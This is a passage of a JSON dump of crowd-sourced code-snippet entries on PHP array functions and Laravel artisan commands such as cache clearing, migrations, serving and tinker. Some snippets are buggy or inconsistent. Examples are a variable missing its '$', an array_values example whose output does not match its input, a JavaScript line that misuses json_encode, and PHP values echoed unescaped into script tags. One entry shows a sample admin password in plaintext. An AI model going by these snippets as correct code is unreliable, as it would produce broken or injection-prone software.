    "description": "$myArr = [1, 2, 3, 4];  array_push($myArr, 5, 8); print_r($myArr); // [1, 2, 3, 4, 5, 8]  $myArr[] = -1; print_r($myArr); // [1, 2, 3, 4, 5, 8, -1]\n$array[$key] = $value; // or $array[] = $value; // or array_push($array, [ mixed $... ]);\n// for php 5.4+ $data += [$key => $value];  // for php 5.4- $data += array($key => $value);\narray_push($cart, 13); \n$fruits = [\"apple\", \"banana\"]; // array_push() function inserts one or more elements to the end of an array array_push($fruits, \"orange\");  // If you use array_push() to add one element to the array, it's better to use // $fruits[] = because in that way there is no overhead of calling a function. $fruits[] = \"orange\";  // output: Array ( [0] => apple [1] => banana [2] => orange )\narray_push ( array &$array [, mixed $... ] ) : int or $array[] = $var;\n",
    "reg_date": "2021-10-12T10:17:28.000Z"
  },
  {
    "id": 3138,
    "keyword": null,
    "link": null,
    "title": " php array remove after index",
    "description": " $myArrayInit = [1 => 'red', 30 => 'orange', 25 => 'velvet', 45 => 'pink']; //<-- Your actual array  $offsetKey = 25; //<---  offset seng mbok butohke      //Lets do the code....     $n = array_keys($myArrayInit); //<---- Grab all the keys of your actual array and put in another array     $count = array_search($offsetKey, $n); //<--- Returns the position of the offset from this array using search     $new_arr = array_slice($myArrayInit, 0, $count + 1, true);//<--- Slice it with the 0 index as start and position+1 as the length parameter.     print_r($new_arr);  // hasile iki >  /* Array (     [1] => red     [30] => orange     [25] => velvet ) */\n",
    "reg_date": "2021-10-12T10:17:29.000Z"
  },
  {
    "id": 3139,
    "keyword": null,
    "link": null,
    "title": " php array remove empty values",
    "description": "<?php $arr = array('1', '', '2', '3', '0'); // Incorrect: print_r(array_filter($arr)); // Correct: print_r(array_filter($arr, 'strlen')); //Custom print_r(array_filter($arr, function ($val) {if ($val > 0) {return true;} else {return false;}}));\n// One liner to remove empty (\"\" empty string) elements from your array. // Note: This code deliberately keeps null, 0 and false elements. $array = array_filter($array, function($a) {return $a !== \"\";});  // OR if you want to trim your array elements first: // Note: This code also removes null and false elements. $array = array_filter($array, function($a) {     return trim($a) !== \"\"; });\n$colors = array(\"red\",\"\",\"blue\",NULL);  $colorsNoEmptyOrNull = array_filter($colors, function($v){   return !is_null($v) && $v !== '';  }); //$colorsNoEmptyOrNull is now [\"red\",\"blue\"]\narray_filter\n$array = array_filter($array, function($a) {     return trim($a) !== \"\"; }); \n",
    "reg_date": "2021-10-12T10:17:29.000Z"
  },
  {
    "id": 3140,
    "keyword": null,
    "link": null,
    "title": " php array remove key value pair",
    "description": " <?php $array = array(\"size\" => \"XL\", \"color\" => \"gold\"); print_r(array_values($array)); ?> Array (     [0] => XL     [1] => gold ) \nunset($array['key-here']);\n",
    "reg_date": "2021-10-12T10:17:29.000Z"
  },
  {
    "id": 3141,
    "keyword": null,
    "link": null,
    "title": " php array remove keys keep values",
    "description": "$colors = array(\"blue\",\"green\",\"red\");  //delete element in array by value \"green\" if (($key = array_search(\"green\", $colors)) !== false) {     unset($colors[$key]); }\n <?php $array = array(\"size\" => \"XL\", \"color\" => \"gold\"); print_r(array_values($array)); ?> Array (     [0] => XL     [1] => gold ) \n",
    "reg_date": "2021-10-12T10:17:29.000Z"
  },
  {
    "id": 3142,
    "keyword": null,
    "link": null,
    "title": " php array remove value if exists",
    "description": "<?php $myArray = array ('Alan', 'Peter', 'Linus', 'Larry'); $pos = array_search('Linus', $myArray); echo 'Linus found at: '.$pos; // Remove from array unset($myArray[$pos]); print_r($myArray); ?>\n",
    "reg_date": "2021-10-12T10:17:29.000Z"
  },
  {
    "id": 3143,
    "keyword": null,
    "link": null,
    "title": " php array reverse keep keys",
    "description": "for($i = count($array) - 1; $i >= 0; $i--){  }\n <?php $input  = array(\"php\", 4.0, array(\"green\", \"red\")); $reversed = array_reverse($input); $preserved = array_reverse($input, true);  print_r($input); print_r($reversed); print_r($preserved); ?>  \n$array = array_reverse($array); foreach($array as $currentElement) {}\n",
    "reg_date": "2021-10-12T10:17:29.000Z"
  },
  {
    "id": 3144,
    "keyword": null,
    "link": null,
    "title": " php array serialize",
    "description": "$array[\"a\"] = \"Foo\"; $array[\"b\"] = \"Bar\"; $array[\"c\"] = \"Baz\"; $array[\"d\"] = \"Wom\";  $str = serialize($array);\nphp array to be storable value in $_SESSION:  serialize($array)   serialized array element to be output on page: unserialize($serializedArray)\n//If you plan to serialize and store it in file or database use below syntax //to safely serialize $safe_string_to_store = base64_encode(serialize($multidimensional_array));  //to unserialize... $array_restored_from_db = unserialize(base64_decode($encoded_serialized_string));\nserializer in php  PHP: serialize()\n",
    "reg_date": "2021-10-12T10:17:29.000Z"
  },
  {
    "id": 3145,
    "keyword": null,
    "link": null,
    "title": " php array size",
    "description": "<?php \t$arr = [\"one\", \"two\", \"three\", \"four\"]; \techo count($arr);   ?>\ncount($myArray);\n// using count() we can get proper length of the array $names = array(\"Ankur\",\"Raj\",\"Ram\",\"Suresh\"); // pass array into count() as parameter it will return array length echo count($names);  // output : 4\n<?php $cars=array(\"Volvo\",\"BMW\",\"Toyota\"); echo count($cars); ?>\necho count($my_array); echo sizeof($my_array);    // alias\n<?php    $names = array(\"Ankur\",\"Raj\",\"Ram\",\"Suresh\");   echo count($names);  $cars=array(\"Volvo\",\"BMW\",\"Toyota\");  echo count($cars); // test\n",
    "reg_date": "2021-10-12T10:17:29.000Z"
  },
  {
    "id": 3146,
    "keyword": null,
    "link": null,
    "title": " php array slice",
    "description": "// array_slice($array, $offset, $length)  $array = array(1,2,3,4,5,6);  // positive $offset: an offset from the begining of array   print_r(array_slice($array, 2)); // [3,4,5,6]  // negative $offset: an offset from the end of array print_r(array_slice($array, -2)); // [5,6]  // positive $length: the slicing will stop $length elements // from offset print_r(array_slice($array, 2, 3)); // [3,4,5]  // negative $length: the slicing will stop $length elements // from the end of array print_r(array_slice($array, 2, -3)); // [3]\narray_slice($array, 0, 50); // same as offset 0 limit 50 in sql\narray_slice() function is used to get selected part of an array. Syntax: array_slice(array, start, length, preserve) *preserve = false (default) If we put preserve=true then the key of value are same as original array.  Example (without preserve): <?php $a=array(\"red\",\"green\",\"blue\",\"yellow\",\"brown\"); print_r(array_slice($a,1,2)); ?>  Output: Array ( [0] => green [1] => blue )    Example (with preserve): <?php $a=array(\"red\",\"green\",\"blue\",\"yellow\",\"brown\"); print_r(array_slice($a,1,2,true)); ?>  Output: Array ( [1] => green [2] => blue )  \nPHP function array_slice(array $array, int $offset, ?int $length, bool $preserve_keys = false) string[] ---------------------------------------------------------------------------------------------------   Extract a slice of the array.    Parameters: array--$array--The input array. int--$offset--If offset is non-negative, the sequence will start at that offset in the array. If offset is negative, the sequence will start that far from the end of the array. int|null--$length--[optional]--If length is given and is positive, then the sequence will have that many elements in it. If length is given and is negative then the sequence will stop that many elements from the end of the array. If it is omitted, then the sequence will have everything from offset up until the end of the array. bool--$preserve_keys--[optional]--Note that array_slice will reorder and reset the array indices by default. You can change this behaviour by setting preserve_keys to true.    Returns: the slice.\n",
    "reg_date": "2021-10-12T10:17:30.000Z"
  },
  {
    "id": 3147,
    "keyword": null,
    "link": null,
    "title": " php array sort by key value",
    "description": "$inventory = array(     array(\"type\"=>\"fruit\", \"price\"=>3.50),    array(\"type\"=>\"milk\", \"price\"=>2.90),    array(\"type\"=>\"pork\", \"price\"=>5.43),  ); $price = array_column($inventory, 'price'); array_multisort($price, SORT_DESC, $inventory);\n  $weight = [     'Pete' => 75,      'Benjamin' => 89,     'Jonathan' => 101   ];  \t   ksort($weight);\n$weight = [     'Pete' => 75,     'Benjamin' => 309,     'Jonathan' => 101 ]; asort($weight); /* weight is now: Array (     [Pete] => 75     [Jonathan] => 101     [Benjamin] => 309 ) To sort descending instead use: arsort */\n usort($array, function ($a, $b) {   return ($a['specific_key'] < $b['specific_key']) ? -1 : 1; }); \n$inventory = [ \t['price' => 10.99, 'product' => 'foo 1'],     ['price' => 5.99, 'product' => 'foo 2'],   \t['price' => 100, 'product' => 'foo 3'],    ];  $price = array_column($inventory, 'price');  array_multisort($price, SORT_DESC, $inventory);\nTo PHP sort array by key, you should use:  \tksort() (for ascending order) or krsort() (for descending order).         To PHP sort array by value, you will need functions: \tasort() and arsort() (for ascending and descending orders).\n",
    "reg_date": "2021-10-12T10:17:30.000Z"
  },
  {
    "id": 3148,
    "keyword": null,
    "link": null,
    "title": " php array to console",
    "description": "echo \"<script>console.log('\" . json_encode($data) . \"');</script>\";\nfunction console_log( $data ){   echo '<script>';   echo 'console.log('. json_encode( $data ) .')';   echo '</script>'; }  Usage: $myvar = array(1,2,3); console_log( $myvar ); // [1,2,3]\n",
    "reg_date": "2021-10-12T10:17:30.000Z"
  },
  {
    "id": 3149,
    "keyword": null,
    "link": null,
    "title": " php array to csv",
    "description": "// open the file \"demosaved.csv\" for writing $file = fopen('demosaved.csv', 'w');   // save the column headers fputcsv($file, array('Column 1', 'Column 2', 'Column 3', 'Column 4', 'Column 5'));   // Sample data. This can be fetched from mysql too $data = array( array('Data 11', 'Data 12', 'Data 13', 'Data 14', 'Data 15'), array('Data 21', 'Data 22', 'Data 23', 'Data 24', 'Data 25'), array('Data 31', 'Data 32', 'Data 33', 'Data 34', 'Data 35'), array('Data 41', 'Data 42', 'Data 43', 'Data 44', 'Data 45'), array('Data 51', 'Data 52', 'Data 53', 'Data 54', 'Data 55') );   // save each row of the data foreach ($data as $row) { fputcsv($file, $row); }   // Close the file fclose($file);\n$lines =file('CSV Address.csv');  foreach($lines as $data) { list($name[],$address[],$status[]) = explode(',',$data); } \nInstead of writing out values consider using 'fputcsv()'.  This may solve your problem immediately.  function array2csv($data, $delimiter = ',', $enclosure = '\"', $escape_char = \"\\\\\") {     $f = fopen('php://memory', 'r+');     foreach ($data as $item) {         fputcsv($f, $item, $delimiter, $enclosure, $escape_char);     }     rewind($f);     return stream_get_contents($f); }  $list = array (     array('aaa', 'bbb', 'ccc', 'dddd'),     array('123', '456', '789'),     array('\"aaa\"', '\"bbb\"') ); var_dump(array2csv($list));  /* I hope it will help you. Namaste Stay Home Stay Safe */\nTo convert an array into a CSV file we can use fputcsv() function. The fputcsv() function is used to format a line as CSV (comma separated values) file and writes it to an open file. The file which has to be read and the fields are sent as parameters to the fputcsv() function and it returns the length of the written string on success or FALSE on failure.  Syntax :  fputcsv( file, fields, separator, enclosure, escape )    Example: <?php     // Create an array of elements  $list = array(      ['Name', 'age', 'Gender'],      ['Bob', 20, 'Male'],      ['John', 25, 'Male'],      ['Jessica', 30, 'Female']  );      // Open a file in write mode ('w')  $fp = fopen('persons.csv', 'w');     // Loop through file pointer and a line  foreach ($list as $fields) {      fputcsv($fp, $fields);  }     fclose($fp);  ?> \n$csv = array_map('str_getcsv', file('data.csv'));\n",
    "reg_date": "2021-10-12T10:17:30.000Z"
  },
  {
    "id": 3150,
    "keyword": null,
    "link": null,
    "title": " php array to js",
    "description": "var arrNums = json_encode(<?php echo $arrNums; ?>);\nvar js_array = [<?php echo '\"'.implode('\",\"',  $disabledDaysRange ).'\"' ?>]; \n//in js do this var masterarray =  <?php echo '[\"' . implode('\", \"', $masterarray) . '\"]' ?>;\n",
    "reg_date": "2021-10-12T10:17:30.000Z"
  },
  {
    "id": 3151,
    "keyword": null,
    "link": null,
    "title": " php array to object",
    "description": "$object = (object) $array;\n$array = (array) $yourObject;\n$object = json_decode(json_encode($array), FALSE); \n$arrayResult = array_map(function($array){     return (object)$array; }, $yourOrinalArray);\n$object = (object)$array; \n",
    "reg_date": "2021-10-12T10:17:30.000Z"
  },
  {
    "id": 3152,
    "keyword": null,
    "link": null,
    "title": " php array to string",
    "description": "$array = array('banana', 'strawberry', 'apple'); comma_separated  = implode(\",\", $array); echo comma_separated; // banana,strawberry,apple\nUsing implode() function in Php ----------------------- Syntax implode(separator,array);    Example <?php   //assigning value to the array   $dummyArr = array(\"Hello\",\"Greppers,\",\"Ankur\",\"here !\");      echo implode(\" \",$dummyArr);// Use of implode function   ?>      Output: Hello Greppers, Ankur here !\n$gadget = array( 'computer', 'mobile', 'tablet' ); echo implode($arr);\n$arr = array('Hello','World!','Beautiful','Day!'); echo implode(\" \",$arr); // Outputs: 'Hello World! Beautiful Day!'\n// for one-dimentional arrays $str = implode('|', $arr);\t// \"v1|v2|v3\"...  // for multi-dimensional/structured arrays, or to keep hierarchy $str = json_encode($arr); // or $str = var_export($arr);\n$requestAsString = print_r($_REQUEST, true);\n",
    "reg_date": "2021-10-12T10:17:30.000Z"
  },
  {
    "id": 3153,
    "keyword": null,
    "link": null,
    "title": " php array unique array to string conversion",
    "description": "//if you have this error it's because array_unique() compare content of array //as strings, but if your array contains other array the function convert array //to string and throw an error. To avoid this error use this :  $newArray = array_unique($array, SORT_REGULAR);\n",
    "reg_date": "2021-10-12T10:17:30.000Z"
  },
  {
    "id": 3154,
    "keyword": null,
    "link": null,
    "title": " php array values",
    "description": "array_values(array)\n<?php    $array = array(\"size\" => \"XL\", \"color\" => \"gold\");  print_r(array_values($array));  ?>\n <?php $array = array(\"size\" => \"XL\", \"color\" => \"gold\"); print_r(array_values($array)); ?> // [\"XL\",\"gold\"]  \n<?php  function data() {     $out[0] = \"abc\";     $out[1] = \"def\";     $out[2] = \"ghi\";     return $out; }  $data = data(); foreach($data as $items){     echo $items; } \nPHP array_values() is an inbuilt function that returns all the values of an array and not the keys. The array_values() function returns the array containing all the values of an array. The returned array will have the numeric keys, starting at 0 and increase by 1  <?php $a=array(\"Name\"=>\"ankur\",\"Age\"=>\"25\",\"Country\"=>\"India\"); print_r(array_values($a)); ?>    Output: Array ( [0] => ankur [1] => 25 [2] => India )    for more visit:  https://appdividend.com/2019/05/09/php-array-values-example-php-array_values-function-tutorial/#:~:text=PHP array_values() is an,0 and increase by 1. https://www.w3schools.com/php/func_array_values.asp  /* I hope it will help you. Thank you _/\\_ */\n$fruits = [\"m\"=>\"banana\", \"c\"=>\"Apple\" , \"a\"=>\"gray\"]; $newArray = array_values($colors); //new Array with values $fruits array echo \"<pre>\"; print_r( $newArray );    //output Array (     [0] => banana     [1] => gray     [2] => blue     [3] => num )\n",
    "reg_date": "2021-10-12T10:17:30.000Z"
  },
  {
    "id": 3155,
    "keyword": null,
    "link": null,
    "title": " php array walk",
    "description": "$arr = array(1, 2, 3); // Call function on every item. // Sign $item as reference to work on original item. array_walk($arr, function(&$item, $key, $myParam){   $item *= 2; }, 'will be in myParam'); // $arr now is [2, 4, 6]\n<?php /* *   For One Dimensional Array */ $alphabets = array(     'a'  =>  'apple',     'b'  =>  'ball',     'c' =>  'cat', );  array_walk($alphabets, 'myFunc', 'for');  function myFunc($value, $key, $param) {     echo \"$key $param $value <br>\"; } ?> /* Out Put:-  a for apple b for ball c for cat */  <?php /* *   For Two Dimensional Arrays:-  array_walk_recursive()  **/ $alphabets = array(     'a'  =>  'apple',     'b'  =>  'ball',     'c' =>  'cat',     array(         'd' =>  'dog',         'e' =>  'elephant',     ) );  array_walk_recursive($alphabets, 'myFunc2', 'for' );  function myFunc2($value, $key, $param){     echo \"$key $param $value <br><br>\"; }; ?>\nPHP function array_walk(object|array &$array, callable $callback, mixed $arg) bool ------------------------------------------------------------------------------   Apply a user function to every member of an array.    Parameters: array|object--$array--The input array. callable--$callback--Typically, funcname takes on two parameters. The array parameter's value being the first, and the key/index second. If funcname needs to be working with the actual values of the array, specify the first parameter of funcname as a reference. Then, any changes made to those elements will be made in the original array itself. Users may not change the array itself from the callback function. e.g. Add/delete elements, unset elements, etc. If the array that array_walk is applied to is changed, the behavior of this function is undefined, and unpredictable. mixed--$arg--[optional] If the optional userdata parameter is supplied, it will be passed as the third parameter to the callback funcname.  Returns: true on success or false on failure.\n",
    "reg_date": "2021-10-12T10:17:30.000Z"
  },
  {
    "id": 3156,
    "keyword": null,
    "link": null,
    "title": " php artisan cache:clear Failed to clear cache. Make sure you have the appropiate permissions",
    "description": "alias larclear='php artisan cache:clear && php artisan config:cache && php artisan permission:cache-reset && php artisan config:clear && php artisan view:clear && php artisan route:clear && php artisan telescope:clear && php artisan debugbar:clear' \n",
    "reg_date": "2021-10-12T10:17:31.000Z"
  },
  {
    "id": 3157,
    "keyword": null,
    "link": null,
    "title": " php artisan cache",
    "description": "//laravel artisan clear cache  php artisan view:clear  php artisan cache:clear php artisan route:clear php artisan config:clear\n//Updated Dec 2020 //laravel artisan clear cache  php artisan view:clear  php artisan cache:clear php artisan route:clear php artisan config:clear\n/**[SAFE] Clears all cache with 1 line!**/  php artisan route:clear &&   php artisan view:clear &&  php artisan config:clear && php artisan cache:clear &&  php artisan clear-compiled\nphp artisan cache:clear php artisan view:clear php artisan route:clear php artisan clear-compiled php artisan config:cache \nbefore change: php artisan cache:clear php artisan config:clear php artisan route:clear after change: php artisan config:cache php artisan route:cache php artisan optimize\n//Laravel 7 / 2021-01 php artisan cache:clear php artisan route:clear php artisan config:clear php artisan optimize\n",
    "reg_date": "2021-10-12T10:17:31.000Z"
  },
  {
    "id": 3158,
    "keyword": null,
    "link": null,
    "title": " php artisan clear commands",
    "description": "php artisan cache:clear php artisan route:clear php artisan config:clear  php artisan view:clear \n//clear php artisan config:clear php artisan route:clear php artisan route:clear php artisan view:clear //cache php artisan config:cache php artisan route:cache php artisan route:cache php artisan view:cache \n",
    "reg_date": "2021-10-12T10:17:31.000Z"
  },
  {
    "id": 3159,
    "keyword": null,
    "link": null,
    "title": " php artisan create controller inside folder",
    "description": "php artisan make:controller frontend/HomePageController --resource\nphp artisan make:controller App\\\\pathName/controllerName\nWant to create controller in a folder? use it like this:  php artisan make:controller NameOfFolder/nameOfController  \n",
    "reg_date": "2021-10-12T10:17:31.000Z"
  },
  {
    "id": 3160,
    "keyword": null,
    "link": null,
    "title": " php artisan db:seed Call to undefined method App\\Models\\Product::factory()",
    "description": "//When running: php artisan db:seed  //Occurs de error: Call to undefined method App\\Models\\[YOUR_MODEL_NAME]::factory()  //Fix - Add the following line to your model \"use HasFactory;\" class [YOUR_MODEL_NAME] extends Model {     use HasFactory;   \t//... }\n",
    "reg_date": "2021-10-12T10:17:31.000Z"
  },
  {
    "id": 3161,
    "keyword": null,
    "link": null,
    "title": " php artisan drop table",
    "description": "To rollback one step:  php artisan migrate:rollback  To rollback multiple steps:  php artisan migrate:rollback --step=[x]    To drop all tables and reload all migrations:  php artisan migrate:fresh\nphp artisan make:migration drop_name_table\nSchema::drop('users');  Schema::dropIfExists('users');\nphp artisan migrate:status\n",
    "reg_date": "2021-10-12T10:17:31.000Z"
  },
  {
    "id": 3162,
    "keyword": null,
    "link": null,
    "title": " php artisan jwt secret",
    "description": "composer require tymon/jwt-auth \nphp artisan jwt:secret\nphp artisan jwt:secret \nphp artisan vendor:publish --provider=\"Tymon\\JWTAuth\\Providers\\LaravelServiceProvider\" \n'providers' => [      ...      Tymon\\JWTAuth\\Providers\\LaravelServiceProvider::class, ] \n",
    "reg_date": "2021-10-12T10:17:31.000Z"
  },
  {
    "id": 3163,
    "keyword": null,
    "link": null,
    "title": " php artisan key generate",
    "description": " php artisan key:generate\n",
    "reg_date": "2021-10-12T10:17:31.000Z"
  },
  {
    "id": 3164,
    "keyword": null,
    "link": null,
    "title": " php artisan make:auth Command \"make:auth\" is not defined.",
    "description": "composer require laravel/ui php artisan ui vue --auth php artisan migrate \ncomposer require laravel/ui php artisan ui vue --auth php artisan migrate\n",
    "reg_date": "2021-10-12T10:17:31.000Z"
  },
  {
    "id": 3165,
    "keyword": null,
    "link": null,
    "title": " php artisan make:controller --resource command",
    "description": "php artisan make:controller MyController\nphp artisan make:controller UserController\nphp artisan make:controller PhotoController --resource --model=Photo\nphp artisan make:controller NameofController --resource // It will create the controller with all methods. laravel version 5.2+\nRoute::resource('photos', PhotoController::class);\n",
    "reg_date": "2021-10-12T10:17:31.000Z"
  },
  {
    "id": 3166,
    "keyword": null,
    "link": null,
    "title": " php artisan make:request",
    "description": "php artisan make:request StoreBlogPost\nphp artisan make:request User\\CreateUserRequest  \n$myRequest = new \\Illuminate\\Http\\Request(); $myRequest->setMethod('POST'); //default METHOD $myRequest->request->add(['foo' => 'bar']); dd($request->foo);\n/**  * Store a new blog post.  *  * @param  Request  $request  * @return Response  */ public function store(Request $request) {     $validatedData = $request->validate([         'title' => 'required|unique:posts|max:255',         'body' => 'required',     ]);      // The blog post is valid... }\n# <values> = foo,bar,... # <field> = array field # <characters> = amount of characters  # accepted\t\t\t\t\t           # active_url # after:<tomorrow>\t\t\t           # after_or_equal:<tomorrow> # alpha\t\t\t\t\t\t           # alpha_dash # alpha_num\t\t\t\t\t           # array # bail \t\t\t\t\t               # before:<today> # before_or_equal:<today>              # between:min,max # boolean\t\t\t\t\t           # confirmed # date\t\t\t\t\t\t           # date_equals:<today> # date_format:<format> \t\t           # different:<name> # digits:<value>\t\t\t           # digits_between:min,max # dimensions:<min/max_with>\t           # distinct # email\t\t\t\t\t\t           # ends_with:<values> # exclude_if:<field>,<value>           # exclude_unless:<field>,<value> # exists:<table>,<column>\t           # file # filled\t\t\t\t\t           # gt:<field> # gte:<field>\t\t\t\t           # image # in:<values>\t\t\t\t           # in_array:<field> # integer\t\t\t\t\t           # ip # ipv4                                 # ipv6   # json\t\t\t\t\t\t           # lt:<field> # lte:<field>       \t\t           # max:<value> # mimetypes:video/avi,...\t           # mimes:jpeg,bmp,png # min:<value>\t\t\t\t           # not_in:<values> # not_regex:<pattern> \t\t           # nullable # numeric\t\t\t\t\t           # password:<auth guard> # present\t\t\t\t\t           # regex:<pattern> # required\t\t\t\t\t           # required_if:<field>,<value> # required_unless:<field>,<value>      # required_with:<fields> # required_with_all:<fields>\t       # required_without:<fields> # required_without_all:<fields>        # same:<field> # size:<characters>\t\t\t           # starts_with:<values> # string\t\t\t\t\t\t       # timezone # unique:<table>,<column>\t\t       # url # uuid\n",
    "reg_date": "2021-10-12T10:17:32.000Z"
  },
  {
    "id": 3167,
    "keyword": null,
    "link": null,
    "title": " php artisan make :migration with model",
    "description": "php artisan make:migration create_users_table \nphp artisan make:model Model_Name -m\nphp artisan make:model ModelName -a \n",
    "reg_date": "2021-10-12T10:17:32.000Z"
  },
  {
    "id": 3168,
    "keyword": null,
    "link": null,
    "title": " php artisan make migrate different folder",
    "description": "php artisan make:migration create_users_table --path=/path/to/your/migration/directory  php artisan migrate --path=/path/to/your/migration/directory\n",
    "reg_date": "2021-10-12T10:17:32.000Z"
  },
  {
    "id": 3169,
    "keyword": null,
    "link": null,
    "title": " php artisan make migration",
    "description": "php artisan make:migration create_users_table \nSchema::table('posts', function (Blueprint $table) {     $table->unsignedBigInteger('user_id');      $table->foreign('user_id')->references('id')->on('users'); }); OR Schema::table('posts', function (Blueprint $table) {     $table->foreignId('user_id')->constrained(); });\nphp artisan make:model Model_Name -m\n// use the make:migration Artisan command to generate a database migration php artisan make:migration create_flights_table  // use --create to indicate whether the migration will be creating a new table php artisan make:migration create_flights_table --create=flights  // use --table to indicate the table name php artisan make:migration add_destination_to_flights_table --table=flights\n# If you would like to generate a database migration when you  # generate the model, you may use the --migration or -m option:  php artisan make:model Flight --migration php artisan make:model Flight -m\nphp artisan make:migration create_users_table --create=users  php artisan make:migration add_votes_to_users_table --table=users\n",
    "reg_date": "2021-10-12T10:17:32.000Z"
  },
  {
    "id": 3170,
    "keyword": null,
    "link": null,
    "title": " php artisan make view controller with methods",
    "description": "php artisan make:controller User --resource\n",
    "reg_date": "2021-10-12T10:17:32.000Z"
  },
  {
    "id": 3171,
    "keyword": null,
    "link": null,
    "title": " php artisan migrate --env=testing",
    "description": "php artisan cache:clear php artisan config:cache  php artisan --env=testing migrate\n",
    "reg_date": "2021-10-12T10:17:32.000Z"
  },
  {
    "id": 3172,
    "keyword": null,
    "link": null,
    "title": " php artisan migrate reset",
    "description": "To rollback one step:  php artisan migrate:rollback  To rollback multiple steps:  php artisan migrate:rollback --step=[x]    To drop all tables and reload all migrations:  php artisan migrate:fresh\n// use the make:migration Artisan command to generate a database migration php artisan make:migration create_flights_table  // use --create to indicate whether the migration will be creating a new table php artisan make:migration create_flights_table --create=flights  // use --table to indicate the table name php artisan make:migration add_destination_to_flights_table --table=flights\nphp artisan migrate:reset\nSchema::table('users', function ($table) {     $table->string('email')->after('id')->nullable(); });\nphp artisan migrate:status\nphp artisan make:Model Product -m -c  --resource\n",
    "reg_date": "2021-10-12T10:17:32.000Z"
  },
  {
    "id": 3173,
    "keyword": null,
    "link": null,
    "title": " php artisan migration refresh",
    "description": "php artisan migrate:rollback\nphp artisan migrate:refresh --step=1\nTry this command it works for me  php artisan migrate:fresh However, be careful! This command will drop all data from your DB:\n$ php artisan migrate:fresh  Dropped all tables successfully. Migration table created successfully. Migrating: 2014_10_12_000000_create_users_table Migrated:  2014_10_12_000000_create_users_table Migrating: 2014_10_12_100000_create_password_resets_table Migrated:  2014_10_12_100000_create_password_resets_table \nphp artisan make:Model Product -m -c  --resource\n",
    "reg_date": "2021-10-12T10:17:32.000Z"
  },
  {
    "id": 3174,
    "keyword": null,
    "link": null,
    "title": " php artisan optimize command",
    "description": "# Install application dependencies, such as the Laravel framework itself. # # If you run composer update in development and commit the `composer.lock` # file to your repository, then `composer install` will install the exact # same versions in production. composer install --no-interaction  # Clear the old boostrap/cache/compiled.php php artisan clear-compiled  # Recreate boostrap/cache/compiled.php php artisan optimize  # Migrate any database changes php artisan migrate \n",
    "reg_date": "2021-10-12T10:17:32.000Z"
  },
  {
    "id": 3175,
    "keyword": null,
    "link": null,
    "title": " php artisan passport install command",
    "description": "php artisan passport:install\n",
    "reg_date": "2021-10-12T10:17:32.000Z"
  },
  {
    "id": 3176,
    "keyword": null,
    "link": null,
    "title": " php artisan php warning require",
    "description": "composer install --ignore-platform-reqs\nThe error is due to missing vendor folder. You just need to run `composer install` in the project directory which will  create a folder named vendor which will have all composer libraries and  `autoload.php` file. \n",
    "reg_date": "2021-10-12T10:17:33.000Z"
  },
  {
    "id": 3177,
    "keyword": null,
    "link": null,
    "title": " php artisan preset react",
    "description": "composer require laravel/ui  // Generate basic scaffolding... php artisan ui react  // Generate login / registration scaffolding... php artisan ui react --auth\ninstall react in laravel:  For Laravel 7+ projects: composer require laravel/ui php artisan ui react  For Laravel 5.5+ projects: php artisan preset react\n",
    "reg_date": "2021-10-12T10:17:33.000Z"
  },
  {
    "id": 3178,
    "keyword": null,
    "link": null,
    "title": " php artisan route:list for specific name",
    "description": "php artisan route:list --name=account.\n",
    "reg_date": "2021-10-12T10:17:33.000Z"
  },
  {
    "id": 3179,
    "keyword": null,
    "link": null,
    "title": " php artisan see last migration",
    "description": "php artisan migrate:rollback\nphp artisan migrate:status\nphp artisan make:migration CreateUsersTable\n",
    "reg_date": "2021-10-12T10:17:33.000Z"
  },
  {
    "id": 3180,
    "keyword": null,
    "link": null,
    "title": " php artisan serve",
    "description": "The full command works like this:  php artisan serve --host=<host IP address> --port=<port to use>  php artisan serve --host=127.0.0.1 --port=8080\n// run laravel project  php artisan serve --port=\"port\" --host=\"host\"\nphp artisan serve   // The original answer is:   /*    The full command works like this:  php artisan serve --host=<host IP address> --port=<port to use>  php artisan serve --host=127.0.0.1 --port=8080   */\nif your laravel application running in server/hosting,  just change DocumentRoot pointing to /path/to/your-laravel-app/public\n",
    "reg_date": "2021-10-12T10:17:33.000Z"
  },
  {
    "id": 3181,
    "keyword": null,
    "link": null,
    "title": " php artisan serve a folder",
    "description": "// if `php artisan serve` doesn't work try this php -S localhost:8000 -t public/\n",
    "reg_date": "2021-10-12T10:17:33.000Z"
  },
  {
    "id": 3182,
    "keyword": null,
    "link": null,
    "title": " php artisan serve another port",
    "description": "# specify port  $ php artisan serve --port=8080  # specify host and port $ php artisan serve --host=localhost --port=8080\n",
    "reg_date": "2021-10-12T10:17:33.000Z"
  },
  {
    "id": 3183,
    "keyword": null,
    "link": null,
    "title": " php artisan serve not working",
    "description": "php -S localhost:8000 -t public/\n",
    "reg_date": "2021-10-12T10:17:33.000Z"
  },
  {
    "id": 3184,
    "keyword": null,
    "link": null,
    "title": " php artisan serve specify ip",
    "description": "php artisan serve --host=some.other.domain --port=8001 \nphp artisan serve --host 192.168.1.101 --port 80\n",
    "reg_date": "2021-10-12T10:17:33.000Z"
  },
  {
    "id": 3185,
    "keyword": null,
    "link": null,
    "title": " php artisan services",
    "description": "php artisan make:provider RiakServiceProvider\n",
    "reg_date": "2021-10-12T10:17:33.000Z"
  },
  {
    "id": 3186,
    "keyword": null,
    "link": null,
    "title": " php artisan storage:link not working",
    "description": "Route::get('/linkstorage', function () {     Artisan::call('storage:link'); }); \n",
    "reg_date": "2021-10-12T10:17:33.000Z"
  },
  {
    "id": 3187,
    "keyword": null,
    "link": null,
    "title": " php artisan storage link",
    "description": "php artisan storage:link\nRoute::get('/foo', function () {     Artisan::call('storage:link'); });\n$exists = Storage::disk('s3')->exists('file.jpg');\n",
    "reg_date": "2021-10-12T10:17:34.000Z"
  },
  {
    "id": 3188,
    "keyword": null,
    "link": null,
    "title": " php artisan store:link",
    "description": "php artisan storage:link\n",
    "reg_date": "2021-10-12T10:17:34.000Z"
  },
  {
    "id": 3189,
    "keyword": null,
    "link": null,
    "title": " php artisan tinker",
    "description": "php artisan tinker # Using this AdminUser Class we can save data from command >>> $admin = new App\\Models\\AdminUser => App\\Models\\AdminUser {#3379} >>> $admin->name = 'Admin' => \"Admin\" >>> $admin->email = 'admin@ids.com' => \"admin@ids.com\" >>> $admin->password = Hash::make('manojd123') => \"$2y$10$s7IfVxrc48RYUbYwIbOuXOQRKdDZzXb.4RIVQ1P8bWPcxY6s1IPZe\" >>> $admin->job_title = 'Admin' => \"Admin\" >>> $admin->save() => true >>>\n// see the count of all users App\\User::count();  // find a specific user and see their attributes App\\User::where('username', 'kamelia')->first();  // find the relationships of a user $user = App\\User::with('posts')->first(); $user->posts;\n",
